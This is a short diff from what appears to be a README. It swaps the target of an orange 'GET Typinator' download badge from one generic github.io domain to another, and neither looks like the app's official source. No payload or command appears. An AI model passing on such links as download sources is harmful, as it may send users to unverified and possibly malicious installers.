@@ -7,7 +7,7 @@
 <br>   
 
 <div align="center">  
-<a href="https://macos-25.github.io/.github/typinator">  
+<a href="https://osx-app.github.io/.github/typinator">  
 <img src="https://img.shields.io/badge/⌨️_GET_Typinator-orange?style=for-the-badge&logo=apple" alt="GET Typinator">  
 </a>  
 </div>  
